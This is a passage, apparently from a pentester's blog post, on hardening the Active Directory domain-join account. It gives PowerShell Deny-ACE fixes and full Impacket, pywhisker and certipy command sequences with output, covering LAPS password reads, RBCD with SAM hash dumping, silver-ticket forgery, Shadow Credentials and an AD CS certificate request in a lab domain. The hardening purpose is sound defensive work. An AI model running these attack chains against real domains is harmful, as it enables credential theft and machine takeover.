+021. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Control Access on my Extended Right USER_CHANGE_PASSWORD (inherited from the LDAP Attribute computer)
+022. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Control Access on my Extended Right USER_FORCE_CHANGE_PASSWORD (inherited from the LDAP Attribute computer)
+023. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Control Access on my Extended Right ALLOWED_TO_AUTHENTICATE (inherited from the LDAP Attribute computer)
+024. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write Extended Properties on my Property Set DNS_HOST_NAME_ATTRIBUTES (inherited from the LDAP Attribute computer)
+025. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write Extended Properties on my LDAP Attribute servicePrincipalName (inherited from the LDAP Attribute computer)
+026. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Read, Write on my Property Set ACCOUNT_RESTRICTIONS (inherited from the LDAP Attribute computer)
+027. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Create Child, Delete Child on my LDAP Attribute computer
+042. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER
+</code></pre><p>This will be mitigated if the owner of the computer account is changed during
+an action in the deployment process. We change our owner manually to Domain Admins
+and continue.</p>
+<h2 id="read-all-permission-again">Read all permission&hellip; again?</h2>
+<p>Did you see entry 015. in <code>DescribeNTSecurityDescriptor.py</code>?</p>
+<pre tabindex="0"><code>015. &#39;TEST.LOCAL\domainjoin&#39; is allowed to List Contents, Read, Delete Tree, List Object, Control Access, Delete, Read Control on me, by inheritance.
+</code></pre><p><em>Read</em> on <em>me</em>. Yep, we can read Legacy-LAPS passwords again:</p>
+<pre tabindex="0"><code>user@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200
+Type help for list of commands
+
+# get_laps_password NEWCOMPUTER$
+Found Computer DN: CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local
+LAPS Password: lwNImJjCtsjKeXmldLVm/zJwSoiGItpi
+</code></pre><p>But we have mitigated this vulnerability by removing <code>Read all properties</code> from the
+<code>CN=Computers,OU=test,OU=local</code> container right?</p>
+<p>When looking through all permissions, <code>Read all properties</code> is once again
+set to our domain join account but it is not inherited:</p>
+<p><img src="not-inherited.png" alt="not-inherited.png"></p>
+<p>After a while of digging, the explanation is that the default
+security descriptor of newly created computer object assigns the Creator/Owner
+with read properties:</p>
+<pre tabindex="0"><code>user@adpen1:~$ pyldapsearch test.local/domainjoin:$PASS &#39;(cn=Computer)&#39; -base-dn &#34;CN=Schema,CN=Configuration,DC=test,DC=local&#34;   -attributes defaultSecurityDescriptor
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] pyldapsearch v0.1.7 - Tw1sm
+
+[*] Binding to test.local
+[*] Distinguished name: CN=SCHEMA,CN=CONFIGURATION,DC=TEST,DC=LOCAL
+[*] Filter: (cn=Computer)
+[*] Returning specific attributes(s): defaultSecurityDescriptor
+--------------------
+defaultSecurityDescriptor: D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPCRLCLORCSDDT;;;CO)(OA;;WP;4c164200-20c0-11d0-a768-00aa006e0529;;CO)(A;;RPLCLORC;;;AU)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(A;;CCDC;;;PS)(OA;;CCDC;bf967aa8-0de6-11d0-a285-00aa003049e2;;PO)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;PS)(OA;;RPWP;77B5B886-944A-11d1-AEBD-0000F80367C1;;PS)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;PS)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;CO)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;CO)(OA;;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;;WP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;;WP;bf967950-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;;WP;bf967953-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)
+</code></pre><p>What we find here is the security descriptor <code>(A;;RPCRLCLORCSDDT;;;CO)</code> which means:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>(A;;...;;;CO)</code></td>
+<td><strong>Allow</strong> ACE applying to <strong>Creator Owner</strong></td>
+</tr>
+<tr>
+<td><code>RP</code></td>
+<td><strong>Read Properties</strong> - allows reading all readable attributes on the object</td>
+</tr>
+<tr>
+<td><code>(also includes CR, LC, LO, RC, SD, DT)</code></td>
+<td>Other rights, but the <code>RP</code> flag specifically grants read access to object properties</td>
+</tr>
+</tbody>
+</table>
+<p>And this is when the mitigation gets tricky. Either we do rocket surgery on
+the inner workings of Active Directory or we attempt to implement Deny ACEs.</p>
+<p>We choose ACEs..</p>
+<p>Active Directory ACEs can either <strong>Allow</strong> or <strong>Deny</strong>. Deny will have
+precedence over Allow. Awesome, easy to remember.</p>
+<p>But this only applies when the Deny is applied at the same (or stricter) level as the Allow.
+And <code>Read all properties</code> is applied directly on the object. A.K.A the most <em>strictiestest</em>.</p>
+<p>This means that we cannot add Deny read on <code>ms-Mcs-AdmPwd</code> attribute at the root level
+in order to Deny read on specific properties.</p>
+<p>So if we would take a scenario where we attempt to Deny/Allow an attribute
+these precedence rules will apply:</p>
+<table>
+<thead>
+<tr>
+<th>OU=test,OU=local/</th>
+<th>CN=Computers/</th>
+<th>CN=PC01</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Allow</td>
+<td>Allow</td>
+<td>Allow</td>
+<td><strong>Allow read</strong></td>
+</tr>
+<tr>
+<td>Deny</td>
+<td>Allow</td>
+<td>Allow</td>
+<td><strong>Allow read</strong></td>
+</tr>
+<tr>
+<td>Deny</td>
+<td>Deny</td>
+<td>Allow</td>
+<td><strong>Allow read</strong></td>
+</tr>
+<tr>
+<td>Deny</td>
+<td>Deny</td>
+<td>Deny</td>
+<td><strong>Deny read</strong></td>
+</tr>
+<tr>
+<td>Allow</td>
+<td>Allow</td>
+<td>Deny</td>
+<td><strong>Deny read</strong></td>
+</tr>
+<tr>
+<td>Allow</td>
+<td>Allow</td>
+<td>Deny and Allow</td>
+<td><strong>Deny read</strong></td>
+</tr>
+</tbody>
+</table>
+<p>So to mitigate Legacy-LAPS read we need to do a post-deploy or scheduled run of a script
+that assigns Deny read on the <code>ms-Mcs-AdmPwd</code> attribute for our domain join
+account directly on the object:</p>
+<pre tabindex="0"><code># ---- SETTINGS ----
+$entity = &#34;domainjoin&#34;
+$guid = &#34;ad27bc2b-cf04-424d-b705-5df50c7d5d37&#34; # ms-Mcs-AdmPwd
+$property = &#34;ReadProperty&#34;
+$permission = &#34;Deny&#34;
+# -------------------
+
+# Define the ACE properties
+$adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property
+$objectType = New-Object Guid $guid # GUID for the specific property
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$accessControlType = [System.Security.AccessControl.AccessControlType]::$permission
+$identityReference = New-Object System.Security.Principal.NTAccount($entity)
+
+# Create the ACE
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType)
+
+# Get ALL computer objects in the forest root domain and apply the deny
+$computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName
+foreach($computer in $computerDNs){
+	# Get the current ACL of the computer object
+	$acl = Get-ACL &#34;AD:$computer&#34;
+	# Add the new ACE to the ACL
+	$acl.AddAccessRule($ace)
+	# Set the modified ACL back to the computer object
+	Set-ACL -Path &#34;AD:$computer&#34; -AclObject $acl
+}
+</code></pre><p>Success:</p>
+<pre tabindex="0"><code>user@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200
+Type help for list of commands
+
+# get_laps_password SRV01$
+Found Computer DN: CN=SRV01,CN=Computers,DC=test,DC=local
+Unable to Read LAPS Password for Computer
+</code></pre><h2 id="the-hidden-write-extended-properties-write-on-msds-allowedtoactonbehalfofotheridentity">The hidden Write Extended Properties (write on msDS-AllowedToActOnBehalfOfOtherIdentity)</h2>
+<p>As a regular pentester of Active Directory the exploitation of Resource Based
+Constrained Delegation is a common way to compromise a remote machine
+by having write access to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute
+on the computer account.</p>
+<p>Just to make sure our setup is hardened we test to write to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute with our domain join account:</p>
+<pre tabindex="0"><code>user@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200
+Type help for list of commands
+
+# set_rbcd DEMOMACHINE$ asdf$
+Found Target DN: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local
+Target SID: S-1-5-21-801220465-3856247095-653829165-1204
+
+Found Grantee DN: CN=asdf,CN=Computers,DC=test,DC=local
+Grantee SID: S-1-5-21-801220465-3856247095-653829165-1190
+Currently allowed sids:
+Delegation rights modified successfully!
+asdf$ can now impersonate users on DEMOMACHINE$ via S4U2Proxy
+</code></pre><p>Oh (no|yes) - we have the privileges to perform RBCD&hellip;</p>
+<p>Without going in depth of the RBCD exploitation technique the following commands
+show how to compromise the remote machine:</p>
+<pre tabindex="0"><code>user@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name RBCD\$ -computer-pass Password123
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully added machine account RBCD$ with password Password123.
+
+user@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200
+Type help for list of commands
+
+# set_rbcd DEMOMACHINE$ RBCD$
+Found Target DN: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local
+Target SID: S-1-5-21-801220465-3856247095-653829165-1182
+
+Found Grantee DN: CN=RBCD,CN=Computers,DC=test,DC=local
+Grantee SID: S-1-5-21-801220465-3856247095-653829165-1205
+Currently allowed sids:
+    S-1-5-21-801220465-3856247095-653829165-1188
+Delegation rights modified successfully!
+RBCD$ can now impersonate users on DEMOMACHINE$ via S4U2Proxy
+
+# exit
+
+user@adpen1:~$ getST.py -spn &#39;cifs/DEMOMACHINE&#39; -dc-ip &#39;100.64.5.200&#39; &#39;test.local/RBCD:Password123&#39; -impersonate test-admin
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating test-admin
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in test-admin@cifs_DEMOMACHINE@TEST.LOCAL.ccache
+
+user@adpen1:~$ KRB5CCNAME=~/test-admin@cifs_DEMOMACHINE@TEST.LOCAL.ccache secretsdump.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x42258c136f02241902f170cf6037bed7
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+[...]
+</code></pre><p>After reviewing all ACLs assigned to our domain join account no one explains
+why we can write to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute:</p>
+<p><img src="creator-owner.png" alt="creator-owner.png"></p>
+<p>After reviewing all ACLs on the computer object and switching them to Deny one-by-one
+it was found that <code>Write Account Restrictions</code> was the ACL providing
+write to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>:</p>
+<p><img src="write-account-restriction.png" alt="write-account-restriction.png"></p>
+<p>Which is represented by <code>Write on my Property Set ACCOUNT_RESTRICTIONS</code> in <code>DescribeNTSecurityDescriptor.py</code></p>
+<pre tabindex="0"><code>user@adpen1:~$ DescribeNTSecurityDescriptor.py -u domainjoin -p $PASS -d test.local --summary -D CN=DEMOMACHINE,CN=Computers,DC=test,DC=local | grep -i domainjoin | grep ACCOUNT_RESTRICTIONS
+010. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my Property Set ACCOUNT_RESTRICTIONS, by inheritance.
+031. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my Property Set ACCOUNT_RESTRICTIONS (inherited from the LDAP Attribute computer)
+</code></pre><p><code>Write account restriction</code> is actually added two times on the computer object which
+our domain join account has created.</p>
+<p>Once per inheritance and recommended by Microsoft:</p>
+<p><img src="write-account-restriction-recommendation.png" alt="write-account-restriction-recommendation.png"></p>
+<p>And once per default SDDL on computer objects <code>(OA;;WP;4c164200-20c0-11d0-a768-00aa006e0529;;CO)</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>(OA;;...;;;CO)</code></td>
+<td><strong>Object-specific Allow ACE</strong> applying to <strong>Creator Owner</strong></td>
+</tr>
+<tr>
+<td><code>WP</code></td>
+<td><strong>Write Property</strong> — grants permission to modify properties within the specified property set</td>
+</tr>
+<tr>
+<td><code>4c164200-20c0-11d0-a768-00aa006e0529</code></td>
+<td><strong>GUID for “Account Restrictions” property set</strong> — includes attributes like <code>userAccountControl</code>, <code>accountExpires</code>, <code>pwdLastSet</code>, etc.</td>
+</tr>
+<tr>
+<td><code>CO</code></td>
+<td><strong>Creator Owner</strong> — the security principal that created the object</td>
+</tr>
+</tbody>
+</table>
+<p>Yet again we do not want to change the default setup of ACLs in Active Directory
+so we apply the Deny-approach:</p>
+<pre tabindex="0"><code># ---- SETTINGS ----
+$entity = &#34;domainjoin&#34;
+$guid = &#34;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79&#34; # Write msDS-AllowedToActOnBehalfOfOtherIdentity
+$property = &#34;WriteProperty&#34;
+$permission = &#34;Deny&#34;
+# -------------------
+
+# Define the ACE properties
+$adRights = [System.DirectoryServices.ActiveDirectoryRights]::$property
+$objectType = New-Object Guid $guid # GUID for the specific property
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$accessControlType = [System.Security.AccessControl.AccessControlType]::$permission
+$identityReference = New-Object System.Security.Principal.NTAccount($entity)
+
+# Create the ACE
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identityReference, $adRights, $accessControlType, $objectType, $inheritanceType)
+
+# Get ALL computer objects in the forest root domain and apply the deny
+$computerDNs = (Get-ADComputer -Filter * -Properties distinguishedName).distinguishedName
+foreach($computer in $computerDNs){
+	# Get the current ACL of the computer object
+	$acl = Get-ACL &#34;AD:$computer&#34;
+	# Add the new ACE to the ACL
+	$acl.AddAccessRule($ace)
+	# Set the modified ACL back to the computer object
+	Set-ACL -Path &#34;AD:$computer&#34; -AclObject $acl
+}
+</code></pre><p>And we&rsquo;ll test it out:</p>
+<pre tabindex="0"><code>user@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200
+Type help for list of commands
+
+# set_rbcd DEMOMACHINE$ RBCD$
+Found Target DN: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local
+Target SID: S-1-5-21-801220465-3856247095-653829165-1182
+
+Found Grantee DN: CN=RBCD,CN=Computers,DC=test,DC=local
+Grantee SID: S-1-5-21-801220465-3856247095-653829165-1205
+Currently allowed sids:
+(&#39;Could not modify object, the server reports insufficient rights: %s&#39;, &#39;00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00&#39;)
+[-] (&#39;Could not modify object, the server reports insufficient rights: %s&#39;, &#39;00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00&#39;)
+</code></pre><p>There we go - we have now mitigated the usage of the RBCD attack on a computer
+account with the domain join account. Happy times.</p>
+<h2 id="change-password">Change password</h2>
+<p>Change password, compared to reset password requires knowledge of the
+current password. The following example shows password change by knowing the current NTLM hash:</p>
+<pre tabindex="0"><code>user@adpen1:~$ changepasswd.py test.local/DEMOMACHINE\$@test.local -hashes 687f3a9249b598f608261f56ef2b36e6 -newhash 687f3a9249b598f608261f56ef2b36e5
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Changing the password of test.local\DEMOMACHINE$
+[*] Connecting to DCE/RPC as test.local\DEMOMACHINE$
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+</code></pre><p>No exploitation of the ACE was found, meaning no mitigation is needed.</p>
+<h2 id="reset-password">Reset password</h2>
+<p>Easy compromise one might think. Reset password, take over the machine, game over, profit, etc. But no.</p>
+<p>The reason for this ACE assignment is sane. In order to rejoin/reinstall
+a machine the domain join account needs the ability to set new passwords
+for the machine account.</p>
+<p>First off, reset password, compared to change password, does not require
+the user to know the current password:</p>
+<pre tabindex="0"><code>user@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name DEMOMACHINE\$ -no-add
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully set password of DEMOMACHINE$ to T9ArZbsCrgxopEPGLBfv4ctcb490RWxL.
+</code></pre><p>The problem that arises when we attempt to exploit this is that we have now broken the trust relationship
+between the computer and Active Directory as the password in AD is no longer in sync
+with the device:</p>
+<p><img src="broken-trust-relationship-active-directory.png" alt="broken-trust-relationship-active-directory.png"></p>
+<p>In order to not bork every client we attack this relationship must somehow
+be repaired.</p>
+<p>But, focusing on the positives, we have control over the password stored in the Active Directory - however
+the password on the local machine is still the initial automatically generated 120
+character password. The password from Active Directory will not be replicated
+to the local machine, as the process for syncing local machine account passwords
+is:</p>
+<ol>
+<li>The computer generates a new random password</li>
+<li>It authenticates to a domain controller using its current password</li>
+<li>It sends the new password to the DC</li>
+<li>The DC updates the password in Active Directory</li>
+<li>The computer stores the new password locally in its LSA (Local Security Authority) secrets</li>
+</ol>
+<p>This occurs by default with an interval of 30 days.</p>
+<p>This is nicely explained by <a href="https://syfuhs.net/on-computer-passwords">@syfuhs (https://syfuhs.net/on-computer-passwords</a>.</p>
+<p>The fact remains that we have the Active Directory stored password.
+So in theory, with <code>ticketer.py</code>, we should be able to generate a valid Kerberos Service Ticket
+and use it to compromise the target machine, even though the trust
+relationship is broken. This is because <code>ticketer.py</code> forges the Service Ticket
+offline (without ever talking to the domain controller), by using the NTLM hash
+of the target&rsquo;s machine account password.</p>
+<p>But this will never work, as we haven&rsquo;t yet compromised the machine meaning
+that we have no knowledge of the locally stored computer account password. I.e.,
+the machine will not be able to decrypt our forged ticket.</p>
+<p>The previous assumption is validated with the following steps:</p>
+<pre tabindex="0"><code>user@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name DEMOMACHINE\$ -no-add -computer-pass Password123
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully set password of DEMOMACHINE$ to Password123.
+
+user@adpen1:~$ ticketer.py -nthash 58a478135a93ac3bf058a5ea0e8fdb71 -domain-sid S-1-5-21-801220465-3856247095-653829165 -user-id 1103 -domain test.local -spn &#39;CIFS/DEMOMACHINE&#39; test-admin
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for test.local/test-admin
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in test-admin.ccache
+Ticket cache: FILE:/home/user/test-admin.ccache
+
+user@adpen1:~$ KRB5CCNAME=~/test-admin.ccache secretsdump.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k -debug
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 
+
+[+] Impacket Library Installation Path: /home/user/.local/share/pipx/venvs/impacket/lib/python3.11/site-packages/impacket
+[+] Using Kerberos Cache: /home/user/test-admin.ccache
+[+] Domain retrieved from CCache: TEST.LOCAL
+[+] Returning cached credential for CIFS/DEMOMACHINE@TEST.LOCAL
+[+] Using TGS from cache
+[+] Username retrieved from CCache: test-admin
+[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
+</code></pre><p>At the moment, <code>Reset password</code> seems to be a dead-end, only resulting in denial
+of service.</p>
+<p>No mitigating actions needed here as we want to keep <code>Reset password</code> ACE
+in order to reinstall machines.</p>
+<h2 id="write-msds-keycredentiallink-attribute---shadow-credentials">Write msDS-KeyCredentialLink attribute - Shadow Credentials</h2>
+<p>Shadow Credentials, a.k.a, the ability to write certificates to the <code>msDS-KeyCredentialLink</code>
+attribute in the computer object and then PKINIT your way to compromising the
+machine has many similarities with RBCD.</p>
+<p>There is no ACL provided by default that gives our domain join account the
+necessary permission to perform this attack as seen in the following codebox:</p>
+<pre tabindex="0"><code>pywhisker -t DEMOMACHINE\$ -u domainjoin -p $PASS -d test.local -a add
+[*] Searching for the target account
+[*] Target user found: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: ea09751f-61a4-ff19-81d9-4c762d24a480
+[*] Updating the msDS-KeyCredentialLink attribute of DEMOMACHINE$
+[!] Could not modify object, the server reports insufficient rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+</code></pre><p>But as the legitimate usage for <code>msDS-KeyCredentialLink</code> is to enable Windows Hello for Business
+where a user can login with PIN or biometrics instead of a password someone needs to
+be able to write to this attribute?</p>
+<p>To enable this login method the computer account must be able to write on its own
+attributes i.e. SELF:</p>
+<pre tabindex="0"><code>user@adpen1:~$ DescribeNTSecurityDescriptor.py -u domainjoin -p $PASS -d test.local --summary -D CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local | grep -i DS_VA
+035. &#39;SELF&#39; is allowed to Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER (inherited from the LDAP Attribute computer)
+061. &#39;TEST.LOCAL\Domain Admins&#39; is allowed to Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER
+062. &#39;Creator Owner&#39; is allowed to Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER (inherited from the LDAP Attribute computer)
+</code></pre><p>So if we circle back to <code>Reset password</code>. Using this permission we will be able to obtain the <code>SELF</code> permission allowing
+us <code>DS_VALIDATED_WRITE_COMPUTER</code> (Validated write to computer attributes).</p>
+<p>So:</p>
+<ol>
+<li>Reset password of our target</li>
+<li>Use the computer account (SELF) to write <code>msDS-KeyCredentialLink</code></li>
+<li>Exchange our PFX for a Kerberos TGT</li>
+<li>Access our target with for instance <code>smbclient.py</code></li>
+</ol>
+<pre tabindex="0"><code>user@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name DEMOMACHINE\$ -no-add -computer-pass Password123
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully set password of NEWCOMPUTER2$ to Password123.
+
+user@adpen1:~$ pywhisker -t DEMOMACHINE\$ -u DEMOMACHINE\$ -p $PASS -d test.local -a add;
+[*] Searching for the target account
+[*] Target user found: CN=DEMOMACHINE,CN=Computers,DC=test,DC=local
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 19215246-f8b6-1747-5b49-8e75a5e68630
+[*] Updating the msDS-KeyCredentialLink attribute of DEMOMACHINE$
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -&gt; PFX with cryptography: a6xwbwfv.pfx
+[+] PFX exportiert nach: a6xwbwfv.pfx
+[i] Passwort f?r PFX: 1Rlwc5Mw6epUx31y0i6j
+[+] Saved PFX (#PKCS12) certificate &amp; key at path: a6xwbwfv.pfx
+[*] Must be used with password: 1Rlwc5Mw6epUx31y0i6j
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+user@adpen1:~$ certipy auth -pfx a6xwbwfv.pfx -password 1Rlwc5Mw6epUx31y0i6j -username DEMOMACHINE\$ -domain test.local -dc-ip 100.64.5.200
+Certipy v5.0.1 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: &#39;demomachine$@test.local&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;demomachine.ccache&#39;
+[*] Wrote credential cache to &#39;demomachine.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;demomachine$&#39;
+[*] Got hash for &#39;demomachine$@test.local&#39;: aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
+
+user@adpen1:~$ KRB5CCNAME=~/demomachine.ccache smbclient.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
+</code></pre><p>Once again. Similar issue as with RBCD and Silver Tickets. We have a discrepancy with the machine account password
+on the local client and Active Directory meaning our forged ticket results in a
+<code>0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED</code> and is not accepted.</p>
+<p>Now, what differs Shadow Credentials from RBCD and Silver Tickets is that you forge a
+Kerberos Service Ticket (ST) encrypted with a NTLM hash - With Shadow Credentials we use PKINIT to exchange a
+public key pair for a Kerberos Ticket Granting Ticket (TGT), which then is used to issue
+Service Tickets (ST).</p>
+<p>This means that, should the relationship between the target and the domain be
+repaired, the target would be able to validate the Kerberos Service Ticket:</p>
+<p><img src="repairing-trust.png" alt="repairing-trust.png"></p>
+<p>And then accessing the target with <code>smbclient.py</code> the attack will succeed:</p>
+<pre tabindex="0"><code>user@adpen1:~$ KRB5CCNAME=~/demomachine.ccache smbclient.py DEMOMACHINE -target-ip 100.64.5.212 -no-pass -k
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+</code></pre><p>Yay?</p>
+<p>So in theory, if we perform this attack 1 day prior to the machine account
+expiration in Active Directory we could maybe break the trust and gain our TGT,
+and then allow the machine to self repair.</p>
+<p>Not so fast. Because in order to repair the relationship the following two statements
+needs to be satisfied:</p>
+<ul>
+<li>Local admin/Local system privileges on the machine to change passwords in LSA
+<ul>
+<li>In a normal, automatic scenario this is done by the <code>Netlogon</code> service</li>
+</ul>
+</li>
+<li>An account with reset password on the computer object in active directory
+<ul>
+<li>In a normal, automatic scenario this permission is made up of the local machine account NTLM authentication</li>
+</ul>
+</li>
+</ul>
+<p>The computer&rsquo;s automatic repair function lacks the second requirement because
+the password in Active Directory has been changed and the authentication will not
+succeed.</p>
+<p>This attack as well is a dead end.</p>
+<p>For the sake of demonstration, the trust can be repaired by opening an elevated command
+prompt on the broken machine and executing the following command with an account allowed
+to <code>Reset password</code> on the machine account where the command is executed:</p>
+<pre tabindex="0"><code>netdom resetpwd /Server:DC01 /UserD:domainjoin /PasswordD:-password-
+</code></pre><p>But this is out of our control.</p>
+<h2 id="ad-cs-computer-certificate">AD CS computer certificate</h2>
+<p>How about using straight up AD CS to exchange a certificate for a TGT?</p>
+<pre tabindex="0"><code>user@adpen1:~$ certipy req -username DEMOMACHINE\$@test.local -password $PASS -ca test-CA01-CA -ns 100.64.5.200 -template Computer2 -dc-ip 100.64.5.200 -target ca01.test.local -upn DEMOMACHINE\$ -sid S-1-5-21-801220465-3856247095-653829165-1215
+Certipy v5.0.1 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 35
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;DEMOMACHINE$&#39;
+[*] Certificate object SID is &#39;S-1-5-21-801220465-3856247095-653829165-1215&#39;
+[*] Saving certificate and private key to &#39;demomachine.pfx&#39;
+[*] Wrote certificate and private key to &#39;demomachine.pfx&#39;
+
+user@adpen1:~$ certipy auth -pfx demomachine.pfx -dc-ip 100.64.5.200 -domain test.local -username DEMOMACHINE\$
+Certipy v5.0.1 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;DEMOMACHINE$&#39;
+[*]     SAN URL SID: &#39;S-1-5-21-801220465-3856247095-653829165-1215&#39;
+[*] Using principal: &#39;demomachine$@test.local&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;demomachine.ccache&#39;
+[*] Wrote credential cache to &#39;demomachine.ccache&#39;
